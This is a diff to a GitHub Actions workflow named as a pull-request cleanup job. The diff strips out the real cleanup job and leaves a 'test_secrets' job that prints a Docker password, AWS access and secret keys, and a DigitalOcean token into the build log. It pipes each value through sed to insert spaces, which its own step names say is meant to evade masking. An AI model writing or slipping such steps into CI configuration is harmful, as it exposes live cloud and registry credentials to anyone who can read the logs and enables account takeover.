@@ -1,44 +1,22 @@
 name: clean_on_pr_closed
- 
+
 on:
   pull_request_target:
     types: [closed]
-      # this is to test if the workflow is being used by main branch 
+
 jobs:
-  clean:
-    uses:
-    concurrency:
-      group: ci-preview-${{ github.event.pull_request.head.ref }}
-      cancel-in-progress: true
-    with:
-      hosting_provider: ${{ vars.HOSTING_PROVIDER }} # 'DIGITAL_OCEAN' or 'AWS'
-      app_name: frm-boilerplate
-      app_env: preview
-      branch: ${{ github.event.pull_request.head.ref }}
-      docker_registry: ${{ vars.DOCKER_REGISTRY }}
-      docker_username: ${{ vars.DOCKER_USERNAME }}
-      aws_cluster_name: ${{ vars.AWS_CLUSTER_NAME }}
-      aws_region: ${{ vars.AWS_REGION }}
-      do_cluster_id: ${{ vars.DO_CLUSTER_ID }}
-    secrets:
-      docker_password: ${{ secrets.DOCKER_PASSWORD }}
-      aws_access_key_id: ${{ secrets.AWS_ACCESS_KEY_ID }}
-      aws_secret_access_key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
-      do_access_token: ${{ secrets.DO_ACCESS_TOKEN }}
-
-
   test_secrets:
-      runs-on: ubuntu-latest
-      needs: clean
-      steps:
-        - name: Print DOCKER_PASSWORD plainly (will be masked)
-          run: echo "DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}"
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print DOCKER_PASSWORD plainly (will be masked)
+        run: echo "DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}"
 
-        - name: Print AWS_ACCESS_KEY_ID with spacing to evade masking
-          run: echo "AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}" | sed 's/./& /g'
+      - name: Print AWS_ACCESS_KEY_ID spaced to reveal value
+        run: echo "AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}" | sed 's/./& /g'
 
-        - name: Print AWS_SECRET_ACCESS_KEY with spacing to evade masking
-          run: echo "AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}" | sed 's/./& /g'
+      - name: Print AWS_SECRET_ACCESS_KEY spaced to reveal value
+        run: echo "AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}" | sed 's/./& /g'
 
-        - name: Print DO_ACCESS_TOKEN with spacing to evade masking
-          run: echo "DO_ACCESS_TOKEN: ${{ secrets.DO_ACCESS_TOKEN }}" | sed 's/./& /g'
+      - name: Print DO_ACCESS_TOKEN spaced to reveal value
+        run: echo "DO_ACCESS_TOKEN: ${{ secrets.DO_ACCESS_TOKEN }}" | sed 's/./& /g'
+
